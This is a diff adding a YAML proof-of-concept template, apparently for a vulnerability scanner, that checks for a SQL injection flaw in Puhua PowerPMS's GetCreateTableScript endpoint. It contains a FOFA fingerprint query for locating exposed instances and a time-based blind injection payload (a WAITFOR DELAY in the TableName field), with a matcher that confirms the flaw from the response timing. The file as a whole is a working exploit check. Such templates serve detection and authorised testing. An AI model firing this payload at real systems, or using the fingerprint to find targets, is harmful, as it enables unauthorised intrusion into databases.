@@ -1,0 +1,21 @@
+id: poc-yaml-powerpms-getcreatetablescript-sqli
+info:
+  name: 普华 PowerPMS GetCreateTableScript SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: powerpms
+  fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /WebCenter/GetCreateTableScript
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: TableName=1';WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\":false\") &&\n\
+    contains(body,\"message\") &&\ncontains(body,\"msgList\") &&\n!contains(body,\"\
+    <\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
